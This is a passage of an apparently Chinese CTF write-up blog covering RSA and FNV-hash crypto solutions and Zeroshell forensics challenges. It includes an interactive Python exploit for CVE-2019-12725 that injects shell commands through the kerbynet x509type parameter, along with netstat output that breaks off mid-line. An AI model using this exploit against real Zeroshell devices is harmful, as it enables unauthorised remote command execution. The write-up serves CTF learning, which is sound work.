a, a)<br>    x = y1 - (b // a) * x1<br>    y = x1<br>    <span class="hljs-keyword">return</span> gcd, x, y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mod_inverse</span>(<span class="hljs-params">h, n</span>):<br>    gcd, a, _ = extended_gcd(h, n)<br>    <span class="hljs-keyword">if</span> gcd != <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;h&#125;</span> 和 <span class="hljs-subst">&#123;n&#125;</span> 不是互质的，无法计算逆元。&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> a % n  <br><br><br>h =   <span class="hljs-comment"># 替换为实际的 h 值</span><br>n =   <span class="hljs-comment"># 替换为实际的 n 值</span><br><br><span class="hljs-keyword">try</span>:<br>    a = mod_inverse(h, n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;满足 a * <span class="hljs-subst">&#123;h&#125;</span> ≡ 1 (mod <span class="hljs-subst">&#123;n&#125;</span>) 的 a 值为: <span class="hljs-subst">&#123;a&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br>n =   <span class="hljs-comment"># 替换为实际的 n 值</span><br>h =   <span class="hljs-comment"># 替换为实际的 h 值</span><br><br><span class="hljs-comment"># 定义符号 p 和 q</span><br>p, q = var(<span class="hljs-string">&#x27;p q&#x27;</span>)<br><br>eq1 = h == <span class="hljs-number">514</span> * p - <span class="hljs-number">114</span> * q<br>eq2 = n == p * q<br><br>solution = solve([eq1, eq2], p, q)<br><br>solution<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>c = <br>n = <br>p = <br>q = <br>e = <span class="hljs-number">0x10001</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(phi)<br>d = invert(e,phi)<br>m= <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>Flag:</li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>b50dd42-e130-<span class="hljs-number">4</span>aa1-af32-f0c228139ba9&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="Fffffhash"><a href="#Fffffhash" class="headerlink" title="Fffffhash"></a>Fffffhash</h3><ul>
+<li>分析题目，一开始想构造格然后应用LLL求解，但一直没构造出来，然后写了个爆破的代码但要跑很久，最后搜索发现本题实际上是fnv算法的应用，去网上找了模板稍微改改，很快就写出来了</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs Python">TARGET = <span class="hljs-number">201431453607244229943761366749810895688</span><br>h0 = <span class="hljs-number">0x6c62272e07bb014262b821756295c58d</span><br>p = <span class="hljs-number">0x0000000001000000000000000000013b</span><br>MOD = <span class="hljs-number">2</span>^<span class="hljs-number">128</span><br><br>n = <span class="hljs-number">16</span><br>M = Matrix.column([p^(n - i - <span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n)] + [-(TARGET - h0*p^n), MOD])<br>M = M.augment(identity_matrix(n+<span class="hljs-number">1</span>).stack(vector([<span class="hljs-number">0</span>] * (n+<span class="hljs-number">1</span>))))<br>Q = Matrix.diagonal([<span class="hljs-number">2</span>^<span class="hljs-number">256</span>] + [<span class="hljs-number">2</span>^<span class="hljs-number">4</span>] * n + [<span class="hljs-number">2</span>^<span class="hljs-number">8</span>])<br>M *= Q<br>M = M.BKZ()<br>M /= Q<br><span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> M:<br>    <span class="hljs-keyword">if</span> r[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">abs</span>(r[-<span class="hljs-number">1</span>]) == <span class="hljs-number">1</span>:<br>        r *= r[-<span class="hljs-number">1</span>]<br>        <span class="hljs-comment">#print(r)</span><br>        good = r[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(good)<br>        <span class="hljs-keyword">break</span><br><br>inp = []<br>y = <span class="hljs-built_in">int</span>(h0*p)<br>t = (h0*p^n + good[<span class="hljs-number">0</span>] * p^(n-<span class="hljs-number">1</span>)) % MOD<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        y_ = (<span class="hljs-built_in">int</span>(y) ^^ <span class="hljs-built_in">int</span>(x)) * p^(n-i-<span class="hljs-number">1</span>) % MOD<br>        <span class="hljs-keyword">if</span> y_ == t:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;good&#x27;</span>, i, x)<br>            inp.append(x)<br>            <span class="hljs-keyword">if</span> i &lt; n-<span class="hljs-number">1</span>:<br>                t = (t + good[i+<span class="hljs-number">1</span>] * p^(n-i-<span class="hljs-number">2</span>)) % MOD<br>                y = ((<span class="hljs-built_in">int</span>(y) ^^ <span class="hljs-built_in">int</span>(x)) * p) % MOD<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, i)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(inp).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment">#020101081b04390001051a020a3d0f0f</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>不断调整n的取值，在n为16、23、29等时可以得到正解</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826747.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="威胁检测与恶意分析"><a href="#威胁检测与恶意分析" class="headerlink" title="威胁检测与恶意分析"></a>威胁检测与恶意分析</h2><h3 id="Zeroshell后期EXP已发布GitHub"><a href="#Zeroshell后期EXP已发布GitHub" class="headerlink" title="&#x3D;&#x3D;Zeroshell后期EXP已发布GitHub&#x3D;&#x3D;"></a>&#x3D;&#x3D;Zeroshell后期EXP已发布GitHub&#x3D;&#x3D;</h3><ul>
+<li><p>代码地址：<a target="_blank" rel="noopener" href="https://github.com/YZS17/CVE-2019-12725">CVE-2019-12725.py</a></p>
+</li>
+<li><p>运行效果：</p>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826011.png" srcset="/img/loading.gif" lazyload alt="image-20241217224055072"></p>
+</li>
+</ul>
+<h3 id="Zeroshell-1"><a href="#Zeroshell-1" class="headerlink" title="Zeroshell_1"></a>Zeroshell_1</h3><ul>
+<li>流量包过滤<code>ip.dst==61.139.2.100&amp;&amp;http</code></li>
+<li>发现流量包</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826939.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>进去发现一串字符</p>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826865.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>一眼flag Base64结果，直接解密</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826035.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="Zeroshell-2"><a href="#Zeroshell-2" class="headerlink" title="Zeroshell_2"></a>Zeroshell_2</h3><ul>
+<li>不多说，上面那个包一眼被打了执行命令</li>
+<li>吐槽自己一句，虚拟机卡了bug，卡了一两个小时，最后和队友换电脑一打就通，呜呜呜难受死了</li>
+<li>CVE-2019-12725</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826506.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>这发包累死了，后面交互这做不下去呀，得写个EXP交互shell</li>
+<li>参照做强网杯第一道题exp结构</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	show = <span class="hljs-string">r&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">     _______    ________    ___   ____ _______       ______  ________   ______</span><br><span class="hljs-string">    / ____/ |  / / ____/   |__ \ / __ &lt;  / __ \     &lt;  /__ \/__  /__ \ / ____/</span><br><span class="hljs-string">   / /    | | / / __/________/ // / / / / /_/ /_____/ /__/ /  / /__/ //___ \</span><br><span class="hljs-string">  / /___  | |/ / /__/_____/ __// /_/ / /\__, /_____/ // __/  / // __/____/ /</span><br><span class="hljs-string">  \____/  |___/_____/    /____/\____/_//____/     /_//____/ /_//____/_____/</span><br><span class="hljs-string">                                                                                                    </span><br><span class="hljs-string">                              		                     CVE-2019-12725 By XU17</span><br><span class="hljs-string">Usage Example:                                                            </span><br><span class="hljs-string">    Target ip&gt; http://192.168.1.1/</span><br><span class="hljs-string">    ——————————————————————————————————————————————————————————————————————————————————</span><br><span class="hljs-string">    powershell&gt; whoami</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>	<span class="hljs-built_in">print</span>(show + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>base_url = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Target ip&gt; &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;——————————————————————————————————————————————————————————————————————————————————&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;powershell&gt; &quot;</span>) <br><br>    <span class="hljs-keyword">if</span> cmd.lower() == <span class="hljs-string">&#x27;exit&#x27;</span>:<br>        <span class="hljs-keyword">break</span><br><br>    payload = <span class="hljs-string">&quot;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=&#x27;%0A&#123;cmd&#125;%0A&#x27;&quot;</span><br>    encoded_cmd = quote(cmd)<br> <br>    url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;base_url&#125;</span><span class="hljs-subst">&#123;payload.replace(<span class="hljs-string">&#x27;&#123;cmd&#125;&#x27;</span>, encoded_cmd)&#125;</span>&quot;</span>  <br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url)<br><br>        clean_text = re.sub(<span class="hljs-string">r&#x27;&lt;html&gt;.*?&lt;/html&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, response.text, flags=re.DOTALL)<br>        clean_text = re.sub(<span class="hljs-string">r&#x27;\n\s*\n&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, clean_text, flags=re.MULTILINE)<br>        half_text = clean_text[:<span class="hljs-built_in">int</span>((<span class="hljs-built_in">len</span>(clean_text)/<span class="hljs-number">2</span>))]<br>        <span class="hljs-built_in">print</span>(half_text)<br><br>    <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Request Error:<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">find</span> / -<span class="hljs-built_in">name</span> <span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826918.png" srcset="/img/loading.gif" lazyload alt="image-20241217223812585"></p>
+<ul>
+<li>俩flag一样的</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">flag&#123;c6045425-6e6e-41d0-be09-95682a4f65c4&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Zeroshell-3"><a href="#Zeroshell-3" class="headerlink" title="Zeroshell_3"></a>Zeroshell_3</h3><ul>
+<li>这木马应该不是一直触发，过段时间出一次</li>
+<li>查看网络状态（得多试试，不一定抓到）</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">netstat -a<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826214.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><code class="hljs Python">cmd&gt; netstat -a<br>Active Internet connections (servers <span class="hljs-keyword">and</span> established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:kerberos-adm          *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> KDC.localdomain:domain  *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.250</span><span class="hljs-number">.254</span>:domain  *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:domain     *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.141</span><span class="hljs-number">.142</span>:domain  *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.locald:domain *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdoma:<span class="hljs-number">953</span> *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56914</span> localhost.localdom:ldap ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">43085</span>      M.ROOT-SERVERS.N:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">33171</span>      a0.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">37965</span>      a0.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">44065</span>      b2.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">37965</span>      a0.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">34095</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">44065</span>      b2.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47235</span>      x.ns.se:domain          ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">38275</span>      M.ROOT-SERVERS.N:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">46061</span>      c.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56910</span> localhost.localdom:ldap ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">40409</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">59067</span>      c0.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56920</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">56587</span>      a0.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">45133</span>      l.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56918</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">45523</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56912</span> localhost.localdom:ldap ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">40015</span>      i.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">44243</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">50969</span>      e.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">51223</span>      M.ROOT-SERVERS.N:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">33225</span>      c.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">35605</span>      l.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">44243</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">50969</span>      e.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">33225</span>      c.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">35583</span>      l.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">59151</span>      z.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">57893</span>      x.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">41387</span>      k.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">59799</span>      l.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">33915</span>      a.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">49391</span>      m.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">57407</span>      j.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56914</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">48997</span>      f.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">56033</span>      x.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56920</span> localhost.localdom:ldap ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span 